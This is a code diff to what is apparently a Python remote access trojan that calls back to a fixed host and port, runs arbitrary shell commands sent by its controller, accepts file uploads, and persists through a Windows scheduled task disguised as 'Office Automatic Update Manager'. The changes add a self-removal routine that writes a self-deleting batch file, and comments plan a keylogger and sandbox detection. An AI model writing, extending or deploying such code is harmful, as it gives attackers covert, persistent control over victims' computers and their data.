@@ -8,6 +8,8 @@ home = ('192.168.0.224', 5000)
 conn = None
 conn_open = False
 buf_size = 4096
+task_name = 'Office Automatic Update Manager'
+dl = '\\'
 
 def get_size(b, s="B"):
     f = 1024
@@ -29,9 +31,9 @@ def run(): #todo add keylogger?
         return
 
     try:
-        subprocess.check_output(['schtasks', '/query', '/tn', 'Office Automatic Update Manager'], stderr=subprocess.PIPE)
+        subprocess.check_output(['schtasks', '/query', '/tn', task_name], stderr=subprocess.PIPE)
     except:
-        task = ['schtasks', '/create', '/sc', 'minute', '/mo', '15', '/f', '/tn', 'Office Automatic Update Manager', '/tr', sys.argv[0]]
+        task = ['schtasks', '/create', '/sc', 'minute', '/mo', '15', '/f', '/tn', task_name, '/tr', sys.argv[0]]
         subprocess.check_output(task, stderr=subprocess.PIPE)
 
     while True:
@@ -79,12 +81,13 @@ def run(): #todo add keylogger?
                         except:
                             response = 1, {'err': 'Invalid location', 'loc': os.getcwd()}
                     else:
-                        result = 'Invalid command'
                         try:
-                            result = subprocess.check_output(cmd['cmd'].split(' '), shell=True, stderr=subprocess.STDOUT).decode()
+                            result = subprocess.check_output(cmd['cmd'].split(' '), shell=True, timeout=60, stderr=subprocess.STDOUT).decode()
                             response = 0, {'output': result, 'loc': os.getcwd()}
+                        except subprocess.TimeoutExpired:
+                            response = 1, {'output': 'Command timed out', 'loc': os.getcwd()}
                         except:
-                            response = 1, {'output': result, 'loc': os.getcwd()}
+                            response = 1, {'output': 'Invalid command', 'loc': os.getcwd()}
                 elif cmd['type'] == 'upload':
                     expected_size = cmd['size']
                     msg = []
@@ -125,6 +128,20 @@ def run(): #todo add keylogger?
                         response = 0, response
                     else:
                         response = 1, 'Invalid directory'
+                elif cmd['type'] == 'remove': #todo add vm/sandbox detection
+                    try:
+                        subprocess.check_output(['schtasks', '/delete', '/f', '/tn', task_name], stderr=subprocess.PIPE)
+                    except:
+                        pass
+                    try:
+                        lock.release()
+                        os.remove('Reserve')
+                    except:
+                        pass
+                    with open('Uninstall.bat', 'w') as f:
+                        f.write(f'TASKKILL /F /IM "{sys.argv[0].split(dl)[-1]}"\nDEL "{sys.argv[0]}"\ngoto 2>nul & del "%~f0"')
+                    subprocess.check_output('Uninstall.bat')
+                    return
                 if response:
                     send(response)
             except:
